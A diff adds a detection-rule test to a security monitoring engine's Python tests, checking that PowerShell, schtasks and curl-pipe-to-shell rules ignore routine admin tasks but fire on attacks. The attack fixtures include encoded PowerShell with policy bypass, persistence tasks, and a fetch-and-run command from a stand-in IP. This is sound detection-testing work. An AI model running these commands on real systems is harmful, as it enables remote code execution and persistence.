@@ -196,6 +196,53 @@ def test_linux_process_rules(engine, enricher):
     assert {"LNX-001", "LNX-002", "LNX-004"} <= set(fired)
 
 
+def test_rules_ignore_admin_tools_but_keep_attacks(enricher):
+    """Báo nhầm lộ ra khi tập lệnh bình thường mở rộng (12/10/2026): WIN-005 bắt lớp vỏ PowerShell của Ansible qua WinRM,
+    WIN-013 bắt mọi `schtasks /create` (cả tác vụ sao lưu), LNX-003 bắt bộ cài chính thức dạng `curl ... | bash`.
+    Mỗi lệnh chạy trên engine riêng để chặn alert lặp không che kết quả."""
+    rules = load_rules(ROOT / "rules")
+    ps, st = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\System32\\schtasks.exe"
+
+    def win(image, cmd):
+        return raw("windows_event", {"event_id": 1, "channel": "Microsoft-Windows-Sysmon/Operational",
+                                     "fields": {"Image": image, "CommandLine": cmd}}, source="eventlog", agent="A001-PC-01")
+
+    def proc(cmd, name="sh"):
+        return raw("process_creation", {"pid": 4321, "ppid": 1, "name": name, "command_line": cmd, "parent_name": "bash"},
+                   source="process")
+
+    def fired(ev):
+        return set(run(RuleEngine(rules), enricher, [ev]))
+
+    benign = {
+        "WIN-005": [win(ps, "PowerShell  -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand "
+                            "UwBlAHQALQBTAHQAcgBpAGMAdABNAG8AZABlACAALQBWAGUAcgBzAGkAbwBuACAATABhAHQAZQBzAHQA"),
+                    win(ps, '"powershell.exe" -noninteractive -encodedcommand '
+                            "WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAA")],
+        "WIN-013": [win(st, 'schtasks /create /tn "Backup\\Nightly" /tr "C:\\Scripts\\backup.cmd" /sc daily /st 23:00 /ru SYSTEM /f')],
+        "LNX-003": [proc("bash -c 'curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash'", "bash"),
+                    proc("sh -c 'wget -qO- https://get.docker.com | sh'")],
+    }
+    attack = {
+        "WIN-005": [win(ps, "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAA="),
+                    win(ps, '"powershell.exe" -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAHkALAAgAEEAdABvAG0AaQBjACEAIgA=')],
+        "WIN-013": [win(st, 'schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"'),
+                    win(st, 'schtasks /Create /TN "CompMgmtBypass" /TR "compmgmt.msc" /SC ONLOGON /RL HIGHEST /F'),
+                    win(st, 'schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db" /sc MINUTE /f'),
+                    win(st, 'SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10')],
+        "LNX-003": [proc("sh -c 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/"
+                         "T1074.001/src/Discovery.sh | sh -s'"),
+                    # cùng lệnh có bộ cài chính thức và một script lạ: đoạn lạ vẫn bị bắt
+                    proc("sh -c 'curl -fsSL https://get.docker.com | sh; curl -s http://203.0.113.5/x.sh | bash'")],
+    }
+    for rid, evs in benign.items():
+        for ev in evs:
+            assert rid not in fired(ev), (rid, ev["data"])
+    for rid, evs in attack.items():
+        for ev in evs:
+            assert rid in fired(ev), (rid, ev["data"])
+
+
 def test_alert_document(engine, enricher):
     doc = enricher.enrich(normalize(apache("198.51.100.23", "GET /a?id=1%20union%20select%201 HTTP/1.1")))
     dets = engine.process(doc)
